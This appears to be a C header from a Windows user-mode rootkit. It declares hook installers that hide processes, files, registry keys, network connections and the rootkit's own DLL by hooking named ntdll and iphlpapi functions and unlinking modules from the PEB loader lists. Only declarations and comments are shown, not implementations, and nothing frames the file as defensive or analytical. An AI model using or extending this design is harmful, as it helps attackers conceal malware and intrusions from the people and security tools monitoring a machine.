/*
 * rkhooks.h - Hide-hook installation surface
 *
 * Each installer is idempotent and returns 0 on success. Failure codes
 * are those of rk_hook() (see common/hook.h) or 1 when the target export
 * could not be resolved.
 *
 * Installers that depend on optional DLLs (iphlpapi/ws2_32) fail silently
 * when the module is not loaded; the DLL entry point re-attempts them
 * from the module watcher (see dllmain.cpp).
 */
#ifndef RK_HOOKS_H
#define RK_HOOKS_H

#ifdef __cplusplus
extern "C" {
#endif

/* Process hiding: NtQuerySystemInformation (classes 5/57/88). */
int rk_hide_process_install(void);

/* File hiding: NtQueryDirectoryFile + NtQueryDirectoryFileEx. */
int rk_hide_file_install(void);

/* Registry hiding: NtEnumerateKey + NtEnumerateValueKey. */
int rk_hide_registry_install(void);

/* Network table hiding: GetExtendedTcpTable / GetExtendedUdpTable. */
int rk_hide_network_install(void);

/* PEB hiding: unlink modules matching [HideModule] and optionally the
 * rootkit DLL itself from the loader lists of this process. */
void rk_hide_peb_self(void);
int  rk_hide_peb_modules(void);

/* Install every hook that only depends on ntdll (process/file/registry).
 * Called from DllMain; network + PEB handling is done separately. */
void rk_hooks_install_core(void);

#ifdef __cplusplus
}
#endif

#endif /* RK_HOOKS_H */
